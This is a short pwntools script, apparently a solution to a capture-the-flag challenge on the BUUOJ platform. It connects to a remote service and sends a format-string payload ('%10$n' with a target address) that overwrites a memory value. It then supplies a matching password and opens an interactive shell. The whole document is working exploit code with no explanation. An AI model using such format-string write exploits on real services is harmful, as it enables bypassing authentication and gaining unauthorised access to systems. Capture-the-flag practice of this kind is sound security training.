from pwn import *

context.log_level='debug'

p=remote("node5.buuoj.cn",28598)

payload=p32(0x804C044)+b"%10$n"

p.sendline(payload)

p.recvuntil('passwd:')

p.sendline('4')

p.interactive()